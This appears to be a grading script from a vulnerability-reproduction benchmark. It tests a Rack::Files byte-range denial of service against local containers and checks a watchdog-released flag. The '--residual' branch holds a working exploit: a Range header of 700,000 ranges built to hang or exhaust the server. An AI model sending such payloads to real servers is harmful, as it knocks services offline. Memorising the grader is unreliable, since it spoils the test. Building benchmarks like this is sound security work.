#!/usr/bin/env bash
# verify.sh --seed|--residual — Rack::Files byte-range DoS (CVE-2024-26141 seed /
# CVE-2026-34826 residual). Effect = hang/OOM -> watchdog releases start-injected
# PCB_FLAG. Judge by matching that token to the current RUN_FLAG (wrong/stale
# override cannot match the start-injected value).
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"

if [[ -n "${WORK_DIR:-}" && -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

# compose port must include --profile, else the profile service is invisible.
# Container listen port is 3000 (not the template 8080 fallback).
# After V0 seed OOM the app container is Exited and `compose port` can fail;
# fall back to start.sh's published host ports in compose.env. Missing app
# port is not env-failure: the watchdog still holds the start-injected flag.
PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port "$VERSION" 3000 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
WDPORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" port watchdog 8888 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  case "$VERSION" in
    v0) PORT="${PORT_V0_0:-}" ;;
    v1) PORT="${PORT_V1_0:-}" ;;
    v2) PORT="${PORT_V2_0:-}" ;;
  esac
fi
WDPORT="${WDPORT:-${PORT_WATCHDOG_0:-}}"
export PCB_TARGET_PORT="${PORT:-}"
[[ -n "$WDPORT" ]] || { echo "watchdog port failed" >&2; exit 20; }
BASE="http://127.0.0.1:${PORT:-0}"

if [[ -z "$PORT" ]]; then
  echo "app port gone (likely OOM); skip probe, judge watchdog"
  OUT='{"latency_ms":0,"status":"CRASH:NoPort","crash":true,"timeout":false}'
elif [[ "$MODE" == "--seed" ]]; then
  # CVE-2024-26141: Range bytes=0-899999 x6000 (V0 OOM/hang / V1 sum>size → 416 fast)
  OUT="$("$PY" "$CASE_DIR/poc/original_poc.py" "$BASE" 2>/dev/null)" || OUT="{}"
else
  # CVE-2026-34826 residual: count unbounded. Inline literal 0-0 x700000
  # (sum 700000 <= file ~900000). V1 still slow multipart assemble.
  OUT="$("$PY" - "$BASE" <<'PY'
import http.client, json, socket, sys, time
base = sys.argv[1]
host, port = base.replace("http://", "").split(":")
header = "bytes=" + ",".join(["0-0"] * 700000)
t0 = time.perf_counter()
try:
    c = http.client.HTTPConnection(host, int(port), timeout=15.0)
    c.request("GET", "/file", headers={"Range": header})
    r = c.getresponse()
    total = 0
    while True:
        chunk = r.read(1 << 16)
        if not chunk:
            break
        total += len(chunk)
    c.close()
    ms = (time.perf_counter() - t0) * 1000.0
    print(json.dumps({"latency_ms": round(ms, 1), "status": r.status,
                      "bytes": total, "crash": False, "timeout": False}))
except (socket.timeout, TimeoutError):
    ms = (time.perf_counter() - t0) * 1000.0
    print(json.dumps({"latency_ms": round(ms, 1), "status": "TIMEOUT",
                      "crash": False, "timeout": True}))
except (ConnectionResetError, BrokenPipeError, http.client.RemoteDisconnected,
        http.client.IncompleteRead, ConnectionError, OSError) as e:
    ms = (time.perf_counter() - t0) * 1000.0
    print(json.dumps({"latency_ms": round(ms, 1),
                      "status": "CRASH:%s" % type(e).__name__,
                      "crash": True, "timeout": False}))
PY
)" || OUT="{}"
fi

echo "$OUT" | head -c 400; echo

# crash / 15s HTTP timeout / latency>1s (T_SLOW) = hang → trip watchdog
# (releases the start-injected PCB_FLAG, not the submitted RUN_FLAG override)
HANG="$("$PY" -c "
import json,sys
try:
    d=json.loads(sys.argv[1])
except Exception:
    d={}
ms=d.get('latency_ms') or 0
print('1' if d.get('crash') or d.get('timeout') or (isinstance(ms,(int,float)) and float(ms)>1000) else '0')
" "$OUT" 2>/dev/null || echo 0)"
if [[ "$HANG" == "1" ]]; then
  curl -sS -m 3 "http://127.0.0.1:${WDPORT}/trip" >/dev/null 2>&1 || true
fi

ST=""; FLAG=""
for i in $(seq 1 30); do
  ST="$(curl -sS -m 5 "http://127.0.0.1:${WDPORT}/status" 2>/dev/null)"
  FLAG="$(printf '%s' "$ST" | "$PY" -c "import json,sys
try:
    print(json.load(sys.stdin).get('flag',''))
except Exception:
    print('')" 2>/dev/null)"
  [[ -n "$FLAG" ]] && break
  sleep 1
done
echo "watchdog_status=$(printf '%s' "$ST" | head -c 150)"
if [[ "$FLAG" == "$RUN_FLAG" ]]; then exit 0; else exit 10; fi
